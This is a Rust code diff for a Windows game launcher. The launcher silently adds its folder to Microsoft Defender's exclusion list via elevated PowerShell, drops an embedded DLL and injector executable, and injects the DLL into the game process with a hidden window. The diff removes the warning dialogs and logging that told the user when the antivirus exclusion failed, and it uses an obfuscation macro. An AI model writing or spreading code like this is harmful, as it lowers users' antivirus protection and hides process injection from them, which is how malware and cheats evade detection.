@@ -1,5 +1,4 @@
 use crate::global_credentials::GLOBAL_CREDENTIALS;
-use log::{error, info};
 use std::process::Command;
 use std::{fs::OpenOptions, io::Read, path::Path};
 
@@ -7,7 +6,7 @@ use std::{fs::OpenOptions, io::Read, path::Path};
 use std::os::windows::process::CommandExt;
 
 use winapi::um::processthreadsapi::GetCurrentProcessId;
-use winapi::um::winuser::{MessageBoxW, MB_ICONWARNING, MB_OK, EnumWindows, GetWindowThreadProcessId};
+use winapi::um::winuser::{EnumWindows, GetWindowThreadProcessId};
 use winapi::{
     shared::minwindef::DWORD,
     um::{
@@ -120,10 +119,10 @@ pub fn ensure_av_exclusion_before_launch() {
             exe_dir
         })
     };
-
-    if let Err(e) = ensure_defender_exclusion(&game_dir) {
-        error!("Failed to add Defender exclusion pre-launch: {}", e);
-    }
+    let dir_for_thread = game_dir.clone();
+    std::thread::spawn(move || {
+        let _ = ensure_defender_exclusion(&dir_for_thread);
+    });
 }
 
 pub fn inject_agnitor(game_pid: DWORD) -> Result<(), Box<dyn std::error::Error>> {
@@ -132,11 +131,8 @@ pub fn inject_agnitor(game_pid: DWORD) -> Result<(), Box<dyn std::error::Error>>
         return Err("err".into());
     }
 
-    // Wait for the game process to create a window (readiness) to improve first-launch reliability
-    let ready = wait_for_process_window(game_pid, 60_000);
-    if !ready {
-        std::thread::sleep(std::time::Duration::from_millis(10_000));
-    }
+    let _ready = wait_for_process_window(game_pid, 10_000);
+    std::thread::sleep(std::time::Duration::from_millis(200));
 
     let game_dir = {
         let game_path_str = clean_path_str(&GLOBAL_CREDENTIALS.get_game_path());
@@ -150,34 +146,38 @@ pub fn inject_agnitor(game_pid: DWORD) -> Result<(), Box<dyn std::error::Error>>
 
     let dll_bytes: &[u8] = include_bytes!("../../agnitor.dll");
     let dll_path = game_dir.join("agnitor.dll");
-    write_if_different(&dll_path, dll_bytes)?;
-
-    let dll32_path = dll_path.canonicalize().unwrap_or(dll_path.clone());
-    let dll32_str = dll32_path.to_str().ok_or("err")?.to_string();
+    let _ = write_if_different(&dll_path, dll_bytes);
+    let dll_path_run = dll_path.canonicalize().unwrap_or(dll_path.clone());
 
     let helper_bytes: &[u8] = include_bytes!("../../terainject32.exe");
     let helper_path_fs = game_dir.join("terainject32.exe");
-    write_if_different(&helper_path_fs, helper_bytes)?;
+    let _ = write_if_different(&helper_path_fs, helper_bytes);
 
     let helper_path = helper_path_fs
         .canonicalize()
         .unwrap_or(helper_path_fs.clone());
-    let helper_str = helper_path.to_str().ok_or("err")?;
 
     // Single helper injection attempt after readiness wait - hide console window
-    let status = Command::new(helper_str)
-        .arg(game_pid.to_string())
-        .arg(&dll32_str)
-        .creation_flags(0x08000000) // CREATE_NO_WINDOW
-        .status()?;
+    // Retry up to 3 times silently
+    let mut last_err: Option<String> = None;
+    for attempt in 1..=3 {
+        let output = Command::new(&helper_path)
+            .arg(game_pid.to_string())
+            .arg(&dll_path_run)
+            .creation_flags(0x08000000) // CREATE_NO_WINDOW
+            .output()?;
 
-    if !status.success() {
-        let code = status.code().unwrap_or(-1);
-        error!("Helper injection failed with exit code: {}", code);
-        return Err(format!("helper failed: {}", code).into());
+        if output.status.success() {
+            return Ok(());
+        } else {
+            last_err = Some("helper failed".to_string());
+            if attempt < 3 {
+                std::thread::sleep(std::time::Duration::from_millis(1500));
+            }
+        }
     }
 
-    return Ok(());
+    return Err("helper failed".into());
 }
 
 /// Attempts to add the specified directory to Microsoft Defender's exclusion list.
@@ -249,41 +249,14 @@ try {
     let _ = std::fs::remove_file(&script_path);
 
     match status2 {
-        Ok(s) if s.success() => {
-            info!("Defender exclusion ensured (elevated) for: {}", dir_str);
-            Ok(())
-        }
-        Ok(s) => {
-            show_warning_message(
-                "Exclusion Failed",
-                "Could not add antivirus exclusion.",
-            );
-            Err(format!("Elevated Defender exclusion attempt failed with status: {:?}", s).into())
-        }
-        Err(e) => {
-            show_warning_message(
-                "Exclusion Failed",
-                "Could not add antivirus exclusion.",
-            );
-            Err(format!("Failed to invoke elevated PowerShell for Defender exclusion: {}", e).into())
-        }
+        Ok(s) if s.success() => Ok(()),
+        Ok(s) => Err(format!("Elevated Defender exclusion attempt failed with status: {:?}", s).into()),
+        Err(e) => Err(format!("Failed to invoke elevated PowerShell for Defender exclusion: {}", e).into()),
     }
 }
 
 /// Shows a warning message box to the user (best-effort, ignored if it fails).
-fn show_warning_message(title: &str, message: &str) {
-    cryptify::flow_stmt!();
-    let title_w: Vec<u16> = to_wide(title);
-    let message_w: Vec<u16> = to_wide(message);
-    unsafe {
-        let _ = MessageBoxW(
-            std::ptr::null_mut(),
-            message_w.as_ptr(),
-            title_w.as_ptr(),
-            MB_OK | MB_ICONWARNING,
-        );
-    }
-}
+fn show_warning_message(_title: &str, _message: &str) {}
 
 fn to_wide(s: &str) -> Vec<u16> {
     use std::os::windows::ffi::OsStrExt;
